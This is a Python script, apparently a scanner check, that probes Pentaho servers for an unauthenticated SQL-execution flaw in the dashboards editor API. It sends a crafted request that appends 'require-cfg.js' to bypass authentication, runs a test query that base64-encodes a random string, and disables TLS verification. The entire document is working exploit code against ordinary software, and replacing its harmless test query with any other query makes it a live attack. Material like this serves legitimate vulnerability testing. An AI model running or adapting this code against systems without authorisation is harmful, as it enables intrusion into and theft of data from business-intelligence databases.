import requests,re,urllib3
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def base64_encoding(string):
    string=base64.b64encode(string.encode())
    return string.decode()
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
f1=randomLowercase(8)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	try:
		url=baseurl+f"pentaho/api/repos/dashboards/editor?command=executeQuery&datasource=pentaho_operations_mart&query=select%20encode('{f1}','base64')&require-cfg.js"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		reditList = response.history
		if response.status_code == 200 and "xml" in response.headers["Content-Type"] and base64_encoding(f1) in response.text:
			r0=True
		else:
			r0=False
	except:
		r0=False
	try:
		url=baseurl+f"api/repos/dashboards/editor?command=executeQuery&datasource=pentaho_operations_mart&query=select%20encode('{f1}','base64')&require-cfg.js"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		reditList = response.history
		if response.status_code == 200 and "xml" in response.headers["Content-Type"] and base64_encoding(f1) in response.text:
			r1=True
		else:
			r1=False
	except:
		r1=False
	if r0 or r1:
		return True
	else:
		return False
